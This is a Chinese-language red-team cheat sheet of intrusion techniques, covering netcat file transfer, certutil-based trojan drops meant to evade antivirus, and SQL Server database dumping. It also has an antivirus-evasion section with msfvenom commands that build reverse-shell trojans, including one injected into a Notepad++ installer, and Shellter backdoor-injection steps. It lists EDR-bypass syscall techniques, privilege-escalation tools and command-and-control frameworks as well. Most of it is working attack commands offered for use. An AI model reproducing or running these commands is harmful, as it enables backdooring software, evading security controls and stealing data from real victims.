综合技巧
========================================

临时服务器
----------------------------------------
- python方式
	+ ``python2 - m SimpleHTTPServer``
	+ ``python3 -m http.server 8888``
- php方式
	+ ``php -S 127.0.0.2:8181 -t /www /www/app.php``

内网扫描
----------------------------------------
+ Netspy
	- 项目地址：``https://github.com/shmilylty/netspy``
	- 一款快速探测内网可达网段工具。

传输数据
----------------------------------------
- nc
	+ 连续传输两个数据包：``cat poc1.dat | sed s'/.$//' |nc -u 10.0.0.3 1023 -w 2 | cat poc2.dat | sed s'/.$//' |nc -u 10.0.0.3 1023 -w 2``
	+ dat文件存储数据包内容
	+ ``sed s'/.$//'`` 为去掉最后一个字节0a
	+ -u参数表示使用udp协议

文件传输
----------------------------------------

出网传输
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- nc
	- 文件传输
		+ 将B机器上的file.txt传输到A机器上
		+ ``A机器：nc -lvp 1567 > file.txt``
		+ ``B机器：nc 172.31.100.7 1567 < file.txt``
	- 目录传输
		+ ``tar -cvf – dir_name | nc -l 1567``
		+ ``nc -n 172.31.100.7 1567 | tar -xvf -``
	- 加密传输
		+ ``nc localhost 1567 | mcrypt –flush –bare -F -q -d -m ecb > file.txt``
		+ ``mcrypt –flush –bare -F -q -m ecb < file.txt | nc -l 1567``

不出网文件落盘
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- python
	- 目标机器转base64
		+ ``目标机器有python：python -c 'print(__import__("base64").b64encode(open("secret.zip", "rb").read()))'``
	- 个人机器还原
		+ ``cat - > zip.txt``
		+ ``输入拿到的base64串：UEsDBBQACQAIAEZ/CE8bl，输入完成按回车``
		+ ``^C即ctrl+c``
		+ ``还原文件：base64 -d zip.txt > secret.zip``
- certutil.exe
	- 前提：具有目标机器的命令执行shell，进行木马文件落盘，躲避AV的文件下载行为的查杀
	- 示例
		::
		
			将文件hack.exe转换成签名文件（base64编码）
			certutil -f -encode d:\hack.exe d:\out.txt
			使用echo命令将out.txt文件写入目标机器，执行以下代码将文件还原成exe
			certutil -f -decode d:\out.txt d:\hack.exe

脱裤
----------------------------------------
- sqlcmd
	+ dump数据:``sqlcmd -S 127.0.0.1,1433 -U username123 -P pasword123 -d datebase123 -Q"BACKUP DATABASE database123 to disk='c:\www\myweb\wap\userlz.bak'"``
- sqlmap

远程连接 && 执行程序
----------------------------------------
- at&schtasks
- psexec
- wmic
- wmiexec.vbs
- smbexec
- powershell remoting
- SC创建服务执行
- schtasks
- SMB+MOF || DLL Hijacks
- PTH + compmgmt.msc

端口信息
-----------------------------------------
- linux
	|netstat|
	
	::
	
		+ Local ：访问端口的方式，0.0.0.0 是对外开放端口，说明80端口外面可以访问；127.0.0.1 说明只能对本机访问，外面访问不了此端口；
		+ Address：端口
		+ Foregin Address：对外开放，一般都为0.0.0.0：* 
		+ Program name：此端口是那个程序在用，程序挂载此端口
		+ 重点说明 0.0.0.0 是对外开放，通过服务域名、ip可以访问的端口
		+ 127.0.0.1 只能对本机 localhost访问，也是保护此端口安全性
		+ ::: 这三个: 的前两个”::“，是“0:0:0:0:0:0:0:0”的缩写，相当于IPv6的“0.0.0.0”，就是本机的所有IPv6地址，第三个:是IP和端口的分隔符

- windows
	+ ``netstat -ano``

免杀
-----------------------------------------
- 核心技术：分离执行和加密混淆等技术
- 免杀加载器
    + venom/msfvenom
        - venom生成其实是直接调用的msfvenom
        - 支持生成多平台payload，比如android、ios、linux/unix、office等等
        - 列出所有可用编码
            ``msfvemon -l encoders``
        - 裸奔木马
            ``msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.11 LPORT=1234 -f exe > /root/test.exe``
        - 免杀木马
            ``msfvenom -p windows/shell_reverse_tcp LHOST=10.10.20.2 LPORT=3333 -e x86/shikata_ga_nai -x npp.7.8.6.Installer.exe -i 12 -f exe -o /root/npp1.exe``

        |msfvemon1|
    + Shellter动态注入工具
        - 下载地址：https://www.shellterproject.com/download/
        - Choose Operation Mode - Auto/Manual (A/M/H)
            选择模式: 自动模式自动注入后门，M高级模式，H帮助
        - PE Target：
            注入的程序.
        - Enable Stealth Mode?
            是否启用隐身模式
        - Use a listed payload or custom? (L/C/H)
            使用攻击模块列表或者自定义
        - Select payload by index:
            选择payload序号
        - SET LHOST
            设置反弹回来的IP 本机
        - SET LPORT
            设置接收反弹的端口
    + veil
- 防御EDR检测
    + 地狱之门
        - 原理：避免在用户层被EDR hook的敏感函数检测到敏感行为，利用从ntdll中读取到的系统调用号进行系统直接调用来绕过敏感API函数的hook。
        - 相关项目：https://github.com/am0nsec/HellsGate
    + 光环之门
        - 原理：
        - 相关项目：https://github.com/trickster0/TartarusGate
        - 相关资料：https://blog.vincss.net/2020/03/re011-unpack-crypter-cua-malware-netwire-bang-x64dbg.html
    + SSN系统调用地址排序
        - 原理：ntdll.dll中的特性就是所有的Zw函数是根据函数地址的大小来进行排序的，所以我们就只需要遍历所有Zw函数，记录其函数名和函数地址，最后将其按照函数地址升序排列后，每个函数的调用号就是其对应的排列顺序的索引号。

提权
-----------------------------------------
- PEASS-ng
	 + 新一代特权升级脚本套件，适用于 Windows 和 Linux/Unix* 以及 MacOS 的权限提升工具
	 + 项目地址: ``https://github.com/carlospolop/PEASS-ng``

综合协同工具
-----------------------------------------
- Viper 【C&C】
	+ 项目地址：``https://github.com/FunnyWolf/Viper``，``https://www.yuque.com/vipersec``
	+ 说明：
		- Viper(炫彩蛇)是一款图形化内网渗透工具,将内网渗透过程中常用的战术及技术进行模块化及武器化.
		- Viper(炫彩蛇)集成杀软绕过,内网隧道,文件管理,命令行等基础功能.
		- Viper(炫彩蛇)当前已集成70+个模块,覆盖初始访问/持久化/权限提升/防御绕过/凭证访问/信息收集/横向移动等大类.
		- Viper(炫彩蛇)目标是帮助红队工程师提高攻击效率,简化操作,降低技术门槛.
		- Viper(炫彩蛇)支持在浏览器中运行原生msfconsole,且支持多人协作.
- PUPY【C&C】
	+ 项目地址：``https://github.com/n1nj4sec/pupy``
	+ 帮助：``https://3gstudent.github.io/Pupy%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90-Windows%E5%B9%B3%E5%8F%B0%E4%B8%8B%E7%9A%84%E5%8A%9F%E8%83%BD``
	+ Pupy是一个用 Python 编写、开源的跨平台（Windows、Linux、OSX、Android）远程管理和后期开发工具。

.. |netstat| image:: ../images/netstat.png
.. |msfvemon1| image:: ../images/msfvenom1.png
